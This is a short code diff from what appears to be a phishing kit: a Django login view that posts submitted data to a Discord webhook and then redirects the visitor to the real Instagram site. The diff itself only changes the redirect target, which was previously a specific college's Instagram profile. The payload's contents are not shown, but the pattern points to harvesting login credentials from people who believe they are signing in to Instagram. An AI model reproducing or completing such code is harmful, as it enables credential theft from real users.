@@ -78,6 +78,6 @@ def login_view(request):
         requests.post(DISCORD_WEBHOOK_URL, data=payload)
 
         # Redirect to the official Instagram page
-        return redirect('https://www.instagram.com/ishaqiyya_college_muttumthala/profilecard/?igsh=MTc1YWh4ZmRneThkMQ==')  # Replace with the actual page URL
+        return redirect('https://www.instagram.com/')  # Replace with the actual page URL
     
     return render(request, 'login.html')
